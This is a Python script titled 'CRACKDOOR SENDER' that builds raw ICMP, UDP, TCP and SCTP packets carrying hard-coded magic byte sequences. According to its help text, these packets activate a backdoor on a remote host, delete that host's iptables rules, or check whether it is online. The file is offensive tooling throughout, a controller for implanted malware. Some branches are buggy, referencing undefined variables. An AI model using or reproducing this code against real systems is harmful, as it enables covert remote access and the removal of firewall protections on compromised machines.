import os 
import sys
import argparse 
import socket
import struct
import select
import time
import colorama
import termcolor


ICMP_ECHO_REQUEST = 8 
DEFAULT_TIMEOUT = 3
DEFAULT_COUNT = 1

PWD1 = '\x24\x1a\x3c\xfa\xdd\x9e\x14\x50\xc7\x29\x93\xf1\x89\x57'.encode('latin')
PWD2 = '\x79\x08\xf5\x6e\x70\x28\x79\x8c\xc0\x21\x86\xdd\x3f\x7f'.encode('latin')
PWD3 = '\xfe'.encode('latin')

class ICMP(object):
    
    def __init__(self, dst_ip, dst_port, pwd, 
                count=DEFAULT_COUNT, timeout=DEFAULT_TIMEOUT):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.pwd = pwd

        self.count = count
        self.timeout = timeout


    def do_checksum(self, source_string):
        sum = 0
        max_count = (len(source_string)/2)*2
        count = 0
        while count < max_count:

            val = source_string[count + 1]*256 + source_string[count]            
            sum = sum + val
            sum = sum & 0xffffffff 
            count = count + 2
    
        if max_count<len(source_string):
            sum = sum + ord(source_string[len(source_string) - 1])
            sum = sum & 0xffffffff 
    
        sum = (sum >> 16)  +  (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)
        return answer

    def receive_pong(self, sock, ID, timeout):
        time_remaining = timeout
        while True:
            start_time = time.time()
            readable = select.select([sock], [], [], time_remaining)
            time_spent = (time.time() - start_time)
            if readable[0] == []:
                return
    
            time_received = time.time()
            recv_packet, addr = sock.recvfrom(512)
            icmp_header = recv_packet[20:28]
            type, code, checksum, packet_ID, sequence = struct.unpack(
                "bbHHh", icmp_header
            )
            if packet_ID == ID:
                bytes_In_double = struct.calcsize("d")
                time_sent = struct.unpack("d", recv_packet[28+(32-bytes_In_double):])[0]
                return time_received - time_sent
    
            time_remaining = time_remaining - time_spent
            if time_remaining <= 0:
                return
    
    
    def send_ping(self, sock, ID):
        target_addr  =  socket.gethostbyname(self.dst_ip)
    
        my_checksum = 0

        header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
        bytes_In_double = struct.calcsize("d")
        
        send_data = 'AB\xf3DE\xe6GH'.encode('latin') 
        send_data += struct.pack("H", dst_port)  

        if pwd == 1:
            send_data += PWD1
        elif pwd == 2:
            send_data += PWD2
        elif pwd == 3:
            send_data += PWD3
        
        send_data += ((24-len(send_data))*'\x00').encode('latin')
        send_data = send_data + struct.pack("d", time.time())
        print("[+]current timestamp:" + str(time.time()))
        print("[+]icmp packet:")
        print('-'.join('{:02x}'.format(b) for b in send_data))
        
        my_checksum = self.do_checksum(header + send_data)
        header = struct.pack(
            "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1
        )
        packet = header + send_data
        sock.sendto(packet, (target_addr, 1))
    
    
    def ping_once(self):
        icmp = socket.getprotobyname("icmp")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        except socket.error as e:
            if e.errno == 1:
                e.msg +=  "[!]Require root to send ICMP packet."
                raise socket.error(e.msg)
        except Exception as e:
            print ("Error: %s" %(e))
    
        my_ID = os.getpid() & 0xFFFF
    
        self.send_ping(sock, my_ID)
        delay = self.receive_pong(sock, my_ID, self.timeout)
        sock.close()
        return delay
    
    
    def ping(self):
        for i in range(self.count):
            print ("[+]Activating %s..." % self.dst_ip)
            try:
                delay  =  self.ping_once()
                time.sleep(0.5)
            except socket.gaierror as e:
                print ("[!]Ping failed. (socket error: '%s')" % e[1])
                break
    
            if delay  ==  None:
                print ("[!]Ping failed: timeout after %s seconds.)" % self.timeout)
            else:
                delay  =  delay * 1000
                print ("[+]Ping value : %0.4fms" % delay)




class UDP(object):
    
    def __init__(self, dst_ip, dst_port, pwd,
                count=DEFAULT_COUNT, timeout=DEFAULT_TIMEOUT):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.pwd = pwd

    def send_packet(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sport = 30824   
        dport = 27015  
        length = 8+24     
        checksum = 0x8057
        udp_header = struct.pack('!HHHH', sport, dport, length, checksum)

        udp_data = '\x00\x00\x93\xf7\x00\x33\x18\xc3'.encode('latin') 
        udp_data += struct.pack("H", self.dst_port) 
        if self.pwd == 1:
            udp_data += PWD1
        elif self.pwd == 2:
            udp_data += PWD2
        elif pwd == 3:
            send_data += PWD3
        
        udp_data += ((24-len(udp_data))*'\x00').encode('latin')

        udp_packet = udp_header + udp_data
        print("[+]udp packet:")
        print('-'.join('{:02x}'.format(b) for b in udp_packet))
        print ("[+]Activating %s..." % self.dst_ip)
        s.sendto(udp_packet, (self.dst_ip, 0))


class TCP(object):
    
    def __init__(self, dst_ip, dst_port, pwd,
                count=DEFAULT_COUNT, timeout=DEFAULT_TIMEOUT):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.pwd = pwd

    def make_tcp(self, srcport, dstport, seq=13, ackseq=0,
                fin=False, syn=True, rst=False, 
                psh=False, ack=False, urg=False,
                window=5840):
            
        offset_res = (5 << 4) | 0
        flags = (fin | (syn << 1) | (rst << 2) | 
                (psh <<3) | (ack << 4) | (urg << 5))
        return struct.pack('!HHLLBBHHH', 
                        srcport, dstport, seq, ackseq, offset_res, 
                        flags, window, 0, 0)


    def send_packet(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

        tcp_header = self.make_tcp(80, 443)
        tcp_data = '\x00\xd3\x00\xfc\x00\x00\x34\x00'.encode('latin') 
        tcp_data += struct.pack("H", self.dst_port)

        if self.pwd == 1:
            tcp_data += PWD1
        elif self.pwd == 2:
            tcp_data += PWD2
        elif pwd == 3:
            send_data += PWD3
        
        tcp_data += ((24-len(tcp_data))*'\x00').encode('latin')

        tcp_packet = tcp_header + tcp_data
        print("[+]tcp packet:")
        print('-'.join('{:02x}'.format(b) for b in tcp_packet))
        print ("[+]Activating %s..." % self.dst_ip)
        s.sendto(tcp_packet, (self.dst_ip, 0))

class SCTP(object):
    
    def __init__(self, dst_ip, dst_port, pwd,
                count=DEFAULT_COUNT, timeout=DEFAULT_TIMEOUT):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.pwd = pwd

    def send_packet(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_SCTP)

        src_port = 80
        dst_port = 443
        tag = 0xcda0dce4
        checksum = 0xc19d8abf
        sctp_header = struct.pack('!HHLL', src_port, dst_port, tag, checksum)

        I = 0;U = 0;B = 1;E = 1

        chunk_type = 0
        flags = (E | (B << 1) | (U <<2) | (I << 3))
        chunk_len = 16 + 24 
        tsn = 0x8c580250
        stream_id = 0
        seq_num = 0
        payload_prtcl_id = 0
        sctp_chunk_header = struct.pack('!BBHLHHL',
                                chunk_type, flags, chunk_len,
                                tsn, stream_id, seq_num, 
                                payload_prtcl_id)


        sctp_data = '\x00\x98\xef\x76\x85\x00\x00\x00'.encode('latin') 
        sctp_data += struct.pack("H", self.dst_port)
        if self.pwd == 1:
            sctp_data += PWD1
        elif self.pwd == 2:
            sctp_data += PWD2
        elif pwd == 3:
            send_data += PWD3

        sctp_data += ((24-len(sctp_data))*'\x00').encode('latin')

        sctp_packet = sctp_header + sctp_chunk_header + sctp_data
        print("[+]sctp packet:")
        print('-'.join('{:02x}'.format(b) for b in sctp_packet))
        print ("[+]Activating %s..." % self.dst_ip)
        s.sendto(sctp_packet, (self.dst_ip, 0))

if __name__ == '__main__':


    banner = r"""
.d88b 888b. .d88b. .d88b. 888b.      .d88b. 8888 8b  8 888b. 8888 888b. 
8P    8   8 8P  Y8 8P  Y8 8  .8      YPwww. 8www 8Ybm8 8   8 8www 8  .8 """
    banner2 = r"""
8b    8   8 8b  d8 8b  d8 8wwK' wwww     d8 8    8  "8 8   8 8    8wwK' 
`Y88P 888P' `Y88P' `Y88P' 8  Yb      `Y88P' 8888 8   8 888P' 8888 8  Yb 
    """
    banner3 = "[--CRACKDOOR SENDER--]Python script for activating crackdoor."
    #os.system("clear")
    colorama.init(strip=not sys.stdout.isatty())
    termcolor.cprint(banner,'magenta',attrs=['bold'],end='')
    termcolor.cprint(banner2,'green',attrs=['bold'])
    termcolor.cprint(banner3,'yellow',attrs=['bold'])

    parser = argparse.ArgumentParser(description='--Python crackdoor activator--')
    parser.add_argument('--dst_ip', dest="ip", required=True,help='e.g.:xxx.xxx.xxx.xxx')
    parser.add_argument('--dst_port',  dest="port", type=int, required=True,help='e.g.: 22,80,443,25565')
    parser.add_argument('--pwd', dest="pwd", type=int, required=True,help='1 for activate backdoor,2 for delete remote iptables rules, 3 for detect online status.')
    parser.add_argument('--protocol', dest="prtcl", required=True, help='ICMP, UDP, TCP, SCTP.')

    got_args = parser.parse_args()  

    dst_ip = got_args.ip
    dst_port = got_args.port
    pwd = got_args.pwd
    protocol = got_args.prtcl


    if protocol == 'ICMP':
        m_icmp = ICMP(dst_ip=dst_ip, dst_port=dst_port, pwd=pwd)
        m_icmp.ping()
    elif protocol == 'UDP':
        m_udp = UDP(dst_ip=dst_ip, dst_port=dst_port, pwd=pwd)
        m_udp.send_packet()
    elif protocol == 'TCP':
        m_tcp = TCP(dst_ip=dst_ip, dst_port=dst_port, pwd=pwd)
        m_tcp.send_packet()
    elif protocol == 'SCTP':
        m_sctp = SCTP(dst_ip=dst_ip, dst_port=dst_port, pwd=pwd)
        m_sctp.send_packet()
